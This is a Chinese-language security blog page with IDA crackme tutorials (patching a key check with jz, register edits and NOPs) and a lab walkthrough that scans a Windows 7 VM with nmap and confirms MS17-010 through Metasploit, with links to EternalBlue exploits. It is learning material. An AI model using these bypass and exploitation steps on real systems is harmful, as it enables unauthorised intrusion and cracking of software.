<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/5/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-Crackme" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Crackme/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Crackme/">
        IDA - Crack me1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Crack-me"><a href="#Crack-me" class="headerlink" title="Crack me"></a>Crack me</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:dwdwdwd</span><br><span class="line"></span><br><span class="line">sorry</span><br><span class="line"></span><br><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:2337</span><br><span class="line"></span><br><span class="line">congrats</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\ncongrats\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nsorry\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">2337</span>) success();</span><br><span class="line">        <span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;                                                                                               </span><br></pre></td></tr></table></figure>

<p><img src="/img/revcra1_Untitled.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_1.png" alt="Untitled"></p>
<p>逐步完成這過程， <code>F2</code> 放置斷點</p>
<p>或是Debugger &gt; Breakpoints &gt; Add breakpoint</p>
<p><img src="/img/revcra1_Untitled_2.png" alt="Untitled"></p>
<p>在執行debugger後，會看到terminal跳出enter key:</p>
<p>先隨便輸入</p>
<p><img src="/img/revcra1_Untitled_3.png" alt="Untitled"></p>
<p>右側綠色箭頭會開始閃爍，如果輸入不是2337會走到右邊，並調用fail function</p>
<ul>
<li>2337-2337&#x3D;0才往左跑</li>
</ul>
<p><img src="/img/revcra1_Untitled_4.png" alt="Untitled"></p>
<p>目前狀況是會往右走call fail function，想讓它變成call success</p>
<p><img src="/img/revcra1_Untitled_5.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_6.png" alt="Untitled"></p>
<p>改變jnz，因為預設是跑fail function</p>
<ul>
<li>Edit &gt; Patch program &gt;　Assemble…</li>
<li>jnz → jz</li>
</ul>
<p><img src="/img/revcra1_Untitled_7.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_8.png" alt="Untitled"></p>
<p>這邊順便談談 jmp &#x2F; jz &#x2F; jnz &#x2F; je &#x2F; jne 這些跳轉指令</p>
<ul>
<li>JMP：無條件跳轉。</li>
<li>JE &#x2F; JZ：如果相等或者為零，則跳轉。</li>
<li>JNE &#x2F; JNZ：如果不相等或者不為零，則跳轉。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">            +------(<span class="keyword">if</span> A == B)------+</span><br><span class="line">            |                       |</span><br><span class="line">           JMP                     JMP</span><br><span class="line">            |                       |</span><br><span class="line">  +-----(<span class="keyword">if</span> C == D)------+          |</span><br><span class="line">  |         |            |          |</span><br><span class="line"> JE        JNE           JZ        JNZ</span><br><span class="line">  |         |            |          |</span><br><span class="line">(<span class="literal">true</span>)    (<span class="literal">true</span>)       (<span class="literal">true</span>)     (<span class="literal">true</span>)</span><br><span class="line">  |         |            |          |</span><br><span class="line"> ...       ...          ...        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再來按F8 步進，記得要在運行程式的狀況下才能進行這動作</p>
<p><img src="/img/revcra1_Untitled_9.png" alt="Untitled"></p>
<p>會看到他跳到了左側，按到call success function會看到跳出訊息</p>
<p><img src="/img/revcra1_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_11.png" alt="Untitled"></p>
<p>按F9繼續執行</p>
<p>建立文件備份</p>
<p>Edit &gt;Patch program &gt;apply patch to input file…</p>
<ul>
<li>勾取 Create backup</li>
<li>會生成.bak</li>
</ul>
<p><img src="/img/revcra1_Untitled_12.png" alt="Untitled"></p>
<p>再次運行執行檔，會看到他已被修復</p>
<ul>
<li>隨便輸入就可以得到congrats</li>
</ul>
<p><img src="/img/revcra1_Untitled_13.png" alt="Untitled"></p>
<hr>
<p>另一種竄改執行的方式</p>
<p>將前面的ida關閉時不保存任何檔案，並刪除除了.bak及c檔的所有檔案</p>
<p>刪除.bak檔案的附檔名，重新開啟ida將檔案引入</p>
<p>記得給予檔案執行權限，debug才不會出現權限錯誤</p>
<p>這次換再跳轉前下斷點並運行debug</p>
<p><img src="/img/revcra1_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_15.png" alt="Untitled"></p>
<p>執行流程依舊是eax - 921h &#x3D;0 才跳轉到success，可以透過修改暫存器的值，16進制的值</p>
<p><img src="/img/revcra1_Untitled_16.png" alt="Untitled"></p>
<p>→ 0x0000000000000000 → 0x0000000000000<strong>921</strong></p>
<p>運行F8步進過去</p>
<ul>
<li><code>F8</code> 會直接運行到下個指令，不進入function</li>
<li><code>F7</code> 會深入到function中一步步運行指令</li>
</ul>
<p><img src="/img/revcra1_Untitled_17.png" alt="Untitled"></p>
<p>成功執行到success</p>
<p><img src="/img/revcra1_Untitled_18.png" alt="Untitled"></p>
<hr>
<p>第三種方式 刪除指令本身執行</p>
<p>需要計算需要再不進行任何操作的情況下替換多少位元組</p>
<ul>
<li>each nop &#x3D; 1</li>
<li>byte, i.e. 0x90</li>
</ul>
<p>設定並查看位元組</p>
<p>Option&gt;General</p>
<p><img src="/img/revcra1_Untitled_19.png" alt="Untitled"></p>
<p>mov eax後面跟著位址值，這位址占用三個位元組(8B 45 F4)</p>
<p><img src="/img/revcra1_Untitled_20.png" alt="Untitled"></p>
<p>暫時停用該區塊的指令執行，而不需要修改原始指令</p>
<p>Edit&gt;Patch Program&gt;Change byte</p>
<ul>
<li>8B 45 F4 3D 21 09 00 00 75 0C B8 00 00 00 00 E8  -&gt; <strong>90 90 90</strong> 3D 21 09 00 00 75 0C B8 00 00 00 00 E8</li>
</ul>
<p><img src="/img/revcra1_Untitled_21.png" alt="Untitled"></p>
<p>將指令由**<code>8B 45 F4</code><strong>改為</strong><code>90 90 90</code><strong>的目的是將原本的指令替換為</strong>NOP（No Operation）**指令，也就是空操作指令</p>
<ul>
<li>NOP指令不會對處理器的狀態或者暫存器的內容進行任何改變，它只是<strong>消耗處理器的時間，但不會有任何實際的作用</strong></li>
<li>通過替換指令為NOP來忽略某些部分的執行，以方便測試或者分析程式的行為</li>
<li>**<code>90</code><strong>是NOP指令的機器碼表示。所以將指令替換為三個</strong><code>90</code>**，就相當於執行了三次NOP，從而將原本的指令暫時禁用</li>
</ul>
<p><img src="/img/revcra1_Untitled_22.png" alt="Untitled"></p>
<p>如果不希望這部分指令發生可以利用這方式</p>
<ul>
<li>位元數必須相同，不然可能蓋到其他指令</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Crackme2/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Crackme2/">
        IDA - Crack me2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Crack-me2"><a href="#Crack-me2" class="headerlink" title="Crack me2"></a>Crack me2</h1><p>使用IDA進行反編譯及創建結構</p>
<p>執行檔案看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme (1)/crackme$ ./crackme2</span><br><span class="line">enter key:dde</span><br><span class="line">enter serial:</span><br><span class="line">Wrong</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原始碼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">struct Keybank &#123;</span><br><span class="line"></span><br><span class="line">	int key;</span><br><span class="line">	int serial;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">success</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCorrect\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">fail</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	int key = 0;</span><br><span class="line">	int serial = 0;</span><br><span class="line"></span><br><span class="line">	struct Keybank kb;</span><br><span class="line"></span><br><span class="line">  kb.key = 1337;</span><br><span class="line">	kb.serial = 1;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter serial:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;serial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( key == kb.key &amp;&amp; serial == kb.serial) success();</span><br><span class="line">	<span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>開啟IDA並反編譯</p>
<p>View &gt; Open subviews&gt;Generate pseudocode</p>
<p>快捷鍵 <code>F5</code> </p>
<p><img src="/img/revcra2_Untitled.png" alt="Untitled"></p>
<p>可以通過重新命名讓程式比較容易理解</p>
<p>比如這邊是要求用戶輸入key → v4</p>
<ul>
<li>按 <code>n</code> 重命名</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br></pre></td></tr></table></figure>

<p><img src="/img/revcra2_Untitled_1.png" alt="Untitled"></p>
<p>另一個v5也通過n命名成serial</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br></pre></td></tr></table></figure>

<p>v6 、 v7 是結構，進入結構創建一個新的結構</p>
<p><img src="/img/revcra2_Untitled_2.png" alt="Untitled"></p>
<p>fn+ins 或是右鍵選擇Add struct.. &gt; 命名 keybank</p>
<p><img src="/img/revcra2_Untitled_3.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_4.png" alt="Untitled"></p>
<p>再來插入兩個成員及兩個欄位，並命名變數名稱，對欄位按 n</p>
<p><img src="/img/revcra2_Untitled_5.png" alt="Untitled"></p>
<p>按兩次 <code>d</code> 才是 4 bytes</p>
<ul>
<li>int → 4 bytes</li>
<li>double → 8 bytes</li>
<li>char → 1 bytes</li>
</ul>
<p><img src="/img/revcra2_Untitled_6.png" alt="Untitled"></p>
<p>把這結構加到C程式中</p>
<p>對 <code>v6</code> 按 <code>y</code> 並取名前面命名的struct的名稱&gt; set the type</p>
<p><img src="/img/revcra2_Untitled_7.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_8.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_9.png" alt="Untitled"></p>
<p>重新命名v6 &gt; Keybank</p>
<p><img src="/img/revcra2_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_11.png" alt="Untitled"></p>
<ul>
<li>修改變數名稱使程式更易讀</li>
<li>進行分析時知道更多訊息，隨時可以修改變數名稱</li>
</ul>
<p>如果想把這邊的程式視圖與反彙編視圖同步</p>
<p>右鍵&gt;Synchrinize..&gt;IDA VIew A…</p>
<p>通過點擊程式碼的位置可以注意到跟視圖的位置是同步的，綠色區塊</p>
<p><img src="/img/revcra2_Untitled_12.png" alt="Untitled"></p>
<p>也可以雙擊凾式看到裡面的反編譯後的程式碼</p>
<p><img src="/img/revcra2_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_15.png" alt="Untitled"></p>
<p>可以併排停靠在一個視窗中，比較方便查看</p>
<p>到視圖中F5反編譯程式碼後，將反編譯的視窗拖曳到主視圖的右側位置</p>
<p><img src="/img/revcra2_Untitled_16.png" alt="Untitled"></p>
<p>這樣是最快瀏覽及對照程式運行過程的方式</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="privilege-Capstone-Privilege" class="article article-type-privilege" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Capstone-Privilege/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Capstone-Privilege/">
        Privilege Escalation
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Capstone-Privilege-Escalation"><a href="#Capstone-Privilege-Escalation" class="headerlink" title="Capstone - Privilege Escalation"></a>Capstone - Privilege Escalation</h1><p>Resources:</p>
<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1?usp=sharing"><strong>Capstone VMs</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor">Old Capstone Videos</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners">Windows Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/linux-privilege-escalation">Linux Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0">**https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0</a>** </p>
<hr>
<p>權限提升 - 提升原使用者權限</p>
<h3 id="Set-up-Blue-VM"><a href="#Set-up-Blue-VM" class="headerlink" title="Set up Blue VM"></a>Set up Blue VM</h3><ul>
<li>user - Password123!</li>
<li>administrator - Password456!</li>
<li>win7</li>
<li>192.168.19.139</li>
</ul>
<p>確認kali可以連線到這台機器</p>
<h3 id="Walkthrough-Blue"><a href="#Walkthrough-Blue" class="headerlink" title="Walkthrough - Blue"></a><strong>Walkthrough - Blue</strong></h3><p>按照慣例先掃描目標機器的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.139**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 21:11 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.139</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">**135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC**</span><br><span class="line">MAC Address: 00:0C:29:B9:88:D6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: **Microsoft Windows 7|2008|8.1**</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">**Service Info: Host: WIN-845Q99OO4PP;** OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| **smb-os-discovery:** </span><br><span class="line">|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: WIN-845Q99OO4PP</span><br><span class="line">|   NetBIOS computer name: WIN-845Q99OO4PP\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System <span class="keyword">time</span>: 2024-02-14T21:12:23-05:00</span><br><span class="line">| **smb2-security-mode:** </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| **smb-security-mode:** </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-02-15T02:12:23</span><br><span class="line">|_  start_date: 2024-02-14T02:35:29</span><br><span class="line">|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:88:d6 (VMware)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.12 seconds</span><br></pre></td></tr></table></figure>

<p>從掃描結果看到不少重要資訊</p>
<ul>
<li><strong>139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</strong></li>
<li><strong>445&#x2F;tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</strong></li>
<li><strong>Service Info: Host: WIN-845Q99OO4PP</strong></li>
<li>Running: <strong>Microsoft Windows 7|2008|8.1</strong></li>
</ul>
<p>到google搜尋 <strong>microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds</strong> 相關版本漏洞</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47176">https://www.exploit-db.com/exploits/47176</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit">https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/d4t4s3c/Win7Blue">https://github.com/d4t4s3c/Win7Blue</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87">https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py">https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42315"><strong>https://www.exploit-db.com/exploits/42315</strong></a></p>
<ul>
<li>通常主要以可以進行遠程控制的payload為主</li>
<li>提到EternalBlue，開啟MSF搜尋一下exploit</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search eternalblue</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   **3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection**</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>auxiliary modules &gt; check、attack、scanning…</strong></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 &gt; **use 3**</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                     Required  Description</span><br><span class="line">   ----         ---------------                     --------  -----------</span><br><span class="line">   CHECK_ARCH   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="literal">false</span>                               no        Check <span class="keyword">for</span> named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/da  <span class="built_in">yes</span>       List of named pipes to check</span><br><span class="line">                ta/wordlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                           <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using</span><br><span class="line">                                                              -metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT        445                                 <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                   no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                          no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                          no        The username to authenticate as</span><br><span class="line">   THREADS      1                                   <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **<span class="built_in">set</span> rhost 192.168.19.139**</span><br><span class="line">rhost =&gt; 192.168.19.139</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **run**</span><br><span class="line"></span><br><span class="line">[+] 192.168.19.139:445    - Host is likely **VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)**</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<ul>
<li>可以確認目標機器是有RCE漏洞的，對它進行利用</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **search eternalblue**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use 